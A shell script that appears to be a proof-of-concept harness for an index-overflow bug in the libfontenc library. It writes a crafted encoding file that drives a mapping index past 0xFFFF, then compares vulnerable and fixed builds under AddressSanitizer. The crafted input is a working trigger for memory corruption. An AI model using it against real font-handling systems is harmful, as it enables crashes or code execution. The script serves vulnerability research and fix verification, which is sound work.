#!/bin/sh
# libfontenc2shell: replay the crafted encoding through the REAL library's
# public API (FontEncFind -> FontEncLoad -> FontEncReallyLoad -> parser).
# Build trees and binaries are uncommitted; raw stdout/stderr is evidence.
set -eu
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
BASE=$(CDPATH= cd -- "$HERE/.." && pwd)
OUT="$HERE/evidence"
FONTSDIR="$HERE/tmp/fonts"
mkdir -p "$OUT" "$FONTSDIR"

# A genuine encodings.dir index, as consumed by FontEncReallyReallyLoad().
printf '2\ncrafted crafted.enc\nsafe safe.enc\n' > "$FONTSDIR/encodings.dir"
# Crafted: SIZE row count 258 makes index (0xff00>>8)*258 = 65790 > 0xFFFF.
printf 'STARTENCODING crafted\nSIZE 256 258\nSTARTMAPPING unicode\n0xff00 0x5a5a\nENDMAPPING\nENDENCODING\n' > "$FONTSDIR/crafted.enc"
# Safe control: same chosen byte at an in-bounds index (255).
printf 'STARTENCODING safe\nSIZE 256 256\nSTARTMAPPING unicode\n0x00ff 0x5a5a\nENDMAPPING\nENDENCODING\n' > "$FONTSDIR/safe.enc"

for v in vuln fixed 1.1.9 1.1.10; do
    for mode in plain asan; do
        libdir="$BASE/build-$v/out-$mode"
        if [ ! -f "$libdir/libfontenc.so" ]; then
            echo "MISSING LIB $v $mode"
            continue
        fi
        bin="$HERE/bin-$v-$mode"
        extra=""
        if [ "$mode" = asan ]; then extra="-fsanitize=address"; fi
        cc -O0 -g -Wall $extra -I"$BASE/build-$v/include" \
            "$HERE/load_via_public_api.c" -L"$libdir" -Wl,-rpath,"$libdir" \
            -lfontenc -o "$bin"
        for charset in safe crafted; do
            tag="$v-$mode-$charset"
            rc=0
            ASAN_OPTIONS="detect_leaks=0:abort_on_error=0:malloc_context_size=16" \
            FONT_ENCODINGS_DIRECTORY="$FONTSDIR" \
            timeout 30 "$bin" "$charset" "$FONTSDIR/dummy.pcf" > "$OUT/$tag.out" 2>&1 || rc=$?
            printf '\nRC=%s\n' "$rc" >> "$OUT/$tag.out"
            printf '%s rc=%s: ' "$tag" "$rc"
            grep -m1 -E 'FontEncFind=|ERROR: AddressSanitizer' "$OUT/$tag.out" || true
        done
    done
done
